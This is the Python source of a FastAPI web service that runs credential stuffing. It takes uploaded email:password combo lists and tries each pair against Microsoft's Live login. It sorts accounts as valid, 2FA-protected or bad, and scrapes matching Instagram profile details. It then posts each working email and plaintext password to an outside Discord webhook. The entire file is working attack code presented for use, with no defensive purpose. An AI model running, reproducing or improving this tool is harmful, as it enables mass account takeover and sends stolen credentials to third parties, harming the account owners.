from fastapi import FastAPI, APIRouter, UploadFile, File, HTTPException, BackgroundTasks
from fastapi.responses import JSONResponse
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field, ConfigDict
from typing import List, Optional
import uuid
from datetime import datetime, timezone
import requests
import re
import asyncio
import json
from urllib.parse import urlparse, parse_qs

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# Create the main app without a prefix
app = FastAPI()

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Global state for checking sessions
active_sessions = {}

# Models
class CheckSession(BaseModel):
    model_config = ConfigDict(extra="ignore")
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    webhook_url: str
    total_combos: int
    checked: int = 0
    hits: int = 0
    bads: int = 0
    twofa: int = 0
    errors: int = 0
    ms_valid: int = 0
    instagram_hits: int = 0
    status: str = "running"  # running, completed, stopped
    created_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))

class WebhookConfig(BaseModel):
    webhook_url: str

class SessionStatus(BaseModel):
    session_id: str
    status: str
    total: int
    checked: int
    hits: int
    bads: int
    twofa: int
    errors: int
    ms_valid: int
    instagram_hits: int

# Microsoft Auth Functions
def get_urlPost_sFTTag(session_obj):
    """Get Microsoft login form URL and sFTTag token"""
    try:
        url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
        response = session_obj.get(url, timeout=15)
        text = response.text
        
        # Extract sFTTag
        match = re.search(r'value="(.+?)"', text, re.S)
        if match:
            sFTTag = match.group(1)
            # Extract urlPost
            match2 = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
            if match2:
                return match2.group(1), sFTTag
    except Exception as e:
        logger.error(f"Error getting sFTTag: {e}")
    return None, None

def check_microsoft_login(email, password):
    """Check if Microsoft/Outlook account is valid"""
    try:
        session_obj = requests.Session()
        session_obj.verify = False
        
        urlPost, sFTTag = get_urlPost_sFTTag(session_obj)
        if not urlPost or not sFTTag:
            return {"success": False, "reason": "failed_to_get_token"}
        
        # Attempt login
        data = {
            'login': email,
            'loginfmt': email,
            'passwd': password,
            'PPFT': sFTTag
        }
        
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        login_response = session_obj.post(urlPost, data=data, headers=headers, allow_redirects=True, timeout=15)
        
        # Check if login successful
        if '#' in login_response.url and 'access_token' in login_response.url:
            token = parse_qs(urlparse(login_response.url).fragment).get('access_token', [None])[0]
            if token:
                return {"success": True, "token": token, "email": email}
        
        # Check for 2FA or security prompts
        if any(value in login_response.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
            return {"success": False, "reason": "2fa_required"}
        
        # Check for bad credentials
        if any(value in login_response.text.lower() for value in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account"]):
            return {"success": False, "reason": "invalid_credentials"}
        
        return {"success": False, "reason": "unknown_error"}
        
    except Exception as e:
        logger.error(f"Microsoft login error: {e}")
        return {"success": False, "reason": "exception", "error": str(e)}

# Instagram Check Functions
def check_instagram_account(email):
    """Check if email has associated Instagram account"""
    try:
        # Method 1: Check via username
        username = email.split('@')[0]
        url = f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'X-Ig-App-Id': '936619743392459',
        }
        
        response = requests.get(url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            if 'data' in data and 'user' in data['data']:
                user_data = data['data']['user']
                return {
                    'found': True,
                    'username': user_data.get('username', username),
                    'full_name': user_data.get('full_name', 'N/A'),
                    'bio': user_data.get('biography', ''),
                    'followers': user_data.get('edge_followed_by', {}).get('count', 0),
                    'following': user_data.get('edge_follow', {}).get('count', 0),
                    'is_private': user_data.get('is_private', False),
                    'profile_pic_url': user_data.get('profile_pic_url_hd', user_data.get('profile_pic_url', '')),
                    'user_id': user_data.get('id', 'N/A')
                }
        
        return {'found': False}
        
    except Exception as e:
        logger.error(f"Instagram check error: {e}")
        return {'found': False, 'error': str(e)}

def send_discord_webhook(webhook_url, email, password, ms_data, instagram_data):
    """Send results to Discord webhook"""
    try:
        if instagram_data and instagram_data.get('found'):
            # Instagram account found
            username = instagram_data.get('username', 'N/A')
            full_name = instagram_data.get('full_name', 'N/A')
            bio = instagram_data.get('bio', 'No bio')
            followers = instagram_data.get('followers', 0)
            following = instagram_data.get('following', 0)
            is_private = instagram_data.get('is_private', False)
            profile_pic = instagram_data.get('profile_pic_url', '')
            
            status = "🔒 Private" if is_private else "🔓 Public"
            
            embed = {
                "title": "✨ Account Found! ✨",
                "description": f"**Microsoft Account + Instagram Profile**\n[🔗 Visit @{username}'s Profile](https://instagram.com/{username})",
                "color": 0xE1306C,
                "thumbnail": {"url": profile_pic} if profile_pic else None,
                "fields": [
                    {"name": "📧 Microsoft Email", "value": f"||{email}||", "inline": True},
                    {"name": "🔑 Password", "value": f"||{password}||", "inline": True},
                    {"name": "✅ MS Login", "value": "Valid", "inline": True},
                    {"name": "━━━━━━━━━━━━━━━━━━━━━━━━━━━━", "value": "**📸 Instagram Profile**", "inline": False},
                    {"name": "👤 Username", "value": f"[@{username}](https://instagram.com/{username})", "inline": True},
                    {"name": "📝 Name", "value": full_name, "inline": True},
                    {"name": "🔐 Status", "value": status, "inline": True},
                    {"name": "👥 Followers", "value": f"{followers:,}", "inline": True},
                    {"name": "➕ Following", "value": f"{following:,}", "inline": True},
                    {"name": "📖 Bio", "value": bio[:1024] if bio else "No bio", "inline": False},
                ],
                "footer": {"text": "Account Checker | MS + Instagram"},
                "timestamp": datetime.utcnow().isoformat()
            }
        else:
            # Only Microsoft valid
            embed = {
                "title": "✅ Microsoft Account Valid",
                "description": "**Microsoft/Outlook Login Successful**\n*No Instagram account found with this email*",
                "color": 0x00B0FF,
                "fields": [
                    {"name": "📧 Email", "value": f"||{email}||", "inline": True},
                    {"name": "🔑 Password", "value": f"||{password}||", "inline": True},
                    {"name": "✅ Status", "value": "MS Valid", "inline": True},
                ],
                "footer": {"text": "Account Checker"},
                "timestamp": datetime.utcnow().isoformat()
            }
        
        payload = {
            "content": "🎉 **New Hit!**" if instagram_data and instagram_data.get('found') else "✅ **Microsoft Account Valid**",
            "embeds": [embed]
        }
        
        response = requests.post(webhook_url, json=payload, timeout=10)
        return response.status_code == 204
        
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return False

async def process_combo(combo_line, session_id, webhook_url):
    """Process a single email:pass combo"""
    try:
        # Parse combo
        parts = combo_line.strip().split(':', 1)
        if len(parts) != 2:
            return {"status": "error", "reason": "invalid_format"}
        
        email, password = parts[0].strip(), parts[1].strip()
        
        if '@' not in email:
            return {"status": "error", "reason": "invalid_email"}
        
        # Step 1: Check Microsoft login
        ms_result = await asyncio.to_thread(check_microsoft_login, email, password)
        
        if not ms_result["success"]:
            if ms_result["reason"] == "2fa_required":
                return {"status": "2fa", "email": email}
            else:
                return {"status": "bad", "email": email, "reason": ms_result["reason"]}
        
        # Step 2: Check Instagram
        instagram_result = await asyncio.to_thread(check_instagram_account, email)
        
        # Step 3: Send to Discord
        await asyncio.to_thread(send_discord_webhook, webhook_url, email, password, ms_result, instagram_result)
        
        # Update session stats
        if instagram_result.get('found'):
            return {"status": "instagram_hit", "email": email, "instagram": instagram_result}
        else:
            return {"status": "ms_valid", "email": email}
            
    except Exception as e:
        logger.error(f"Error processing combo: {e}")
        return {"status": "error", "reason": str(e)}

async def process_combos_background(session_id: str, combos: List[str], webhook_url: str):
    """Background task to process all combos"""
    session = active_sessions.get(session_id)
    if not session:
        return
    
    for combo in combos:
        if session["status"] == "stopped":
            break
            
        result = await process_combo(combo, session_id, webhook_url)
        
        # Update stats
        session["checked"] += 1
        
        if result["status"] == "instagram_hit":
            session["hits"] += 1
            session["instagram_hits"] += 1
            session["ms_valid"] += 1
        elif result["status"] == "ms_valid":
            session["ms_valid"] += 1
        elif result["status"] == "2fa":
            session["twofa"] += 1
        elif result["status"] == "bad":
            session["bads"] += 1
        elif result["status"] == "error":
            session["errors"] += 1
        
        # Small delay to avoid rate limiting
        await asyncio.sleep(0.5)
    
    # Mark as completed
    session["status"] = "completed"
    
    # Save to database
    session_data = session.copy()
    session_data['completed_at'] = datetime.now(timezone.utc).isoformat()
    await db.check_sessions.insert_one(session_data)

# API Routes
@api_router.get("/")
async def root():
    return {"message": "Account Checker API", "version": "1.0"}

@api_router.post("/check/upload")
async def upload_combos(
    background_tasks: BackgroundTasks,
    file: UploadFile = File(...),
    webhook_url: str = ""
):
    """Upload combo file and start checking"""
    try:
        # Read file
        content = await file.read()
        combos = content.decode('utf-8', errors='ignore').splitlines()
        combos = [c.strip() for c in combos if c.strip()]
        
        # Remove duplicates
        combos = list(set(combos))
        
        # Create session
        session_id = str(uuid.uuid4())
        session_data = {
            "id": session_id,
            "webhook_url": webhook_url,
            "total_combos": len(combos),
            "checked": 0,
            "hits": 0,
            "bads": 0,
            "twofa": 0,
            "errors": 0,
            "ms_valid": 0,
            "instagram_hits": 0,
            "status": "running",
            "created_at": datetime.now(timezone.utc).isoformat()
        }
        
        active_sessions[session_id] = session_data
        
        # Start background processing
        background_tasks.add_task(process_combos_background, session_id, combos, webhook_url)
        
        return {
            "success": True,
            "session_id": session_id,
            "total_combos": len(combos),
            "message": "Processing started"
        }
        
    except Exception as e:
        logger.error(f"Upload error: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@api_router.get("/check/status/{session_id}")
async def get_session_status(session_id: str):
    """Get current status of checking session"""
    session = active_sessions.get(session_id)
    if not session:
        # Check database
        db_session = await db.check_sessions.find_one({"id": session_id}, {"_id": 0})
        if db_session:
            return db_session
        raise HTTPException(status_code=404, detail="Session not found")
    
    return session

@api_router.post("/check/stop/{session_id}")
async def stop_session(session_id: str):
    """Stop a running session"""
    session = active_sessions.get(session_id)
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")
    
    session["status"] = "stopped"
    return {"success": True, "message": "Session stopped"}

@api_router.get("/sessions")
async def get_all_sessions():
    """Get all sessions (active and completed)"""
    # Get active sessions
    active = list(active_sessions.values())
    
    # Get completed from database
    completed = await db.check_sessions.find({}, {"_id": 0}).to_list(100)
    
    return {
        "active": active,
        "completed": completed
    }

@api_router.post("/test-webhook")
async def test_webhook(config: WebhookConfig):
    """Test Discord webhook"""
    try:
        payload = {
            "content": "✅ Webhook test successful!",
            "embeds": [{
                "title": "Test Message",
                "description": "Your webhook is configured correctly.",
                "color": 0x00FF00,
                "timestamp": datetime.utcnow().isoformat()
            }]
        }
        response = requests.post(config.webhook_url, json=payload, timeout=10)
        
        if response.status_code == 204:
            return {"success": True, "message": "Webhook test successful"}
        else:
            return {"success": False, "message": f"Webhook returned status {response.status_code}"}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

# Include the router in the main app
app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()
